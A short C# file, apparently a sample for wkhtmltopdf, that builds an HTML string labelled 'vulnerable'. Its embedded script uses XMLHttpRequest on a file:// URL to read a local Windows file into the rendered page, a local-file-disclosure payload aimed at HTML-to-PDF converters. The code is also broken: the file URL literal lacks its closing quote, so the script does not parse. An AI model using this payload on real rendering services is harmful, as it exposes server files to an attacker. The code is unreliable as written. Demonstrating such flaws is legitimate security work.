using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WKhtmltopdfSample
{
    public static class TemplateGenerator
    {
        public static string GetVunerableHTMLString()
        {
            var sb = new StringBuilder();
            sb.Append(@"<html>
                <head>
                </head>
                <body>
                  <div id=teste>hello from softdevplus<div>
                </body>");
            sb.Append(@"<script>
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() { document.getElementById('teste')
        .innerHTML=this.response;
                };
                xhttp.open('GET', 'file:\\\C:/dism.txt, true);
                xhttp.send();
              </script>
            </html>");
            return sb.ToString();
        }
    }
}
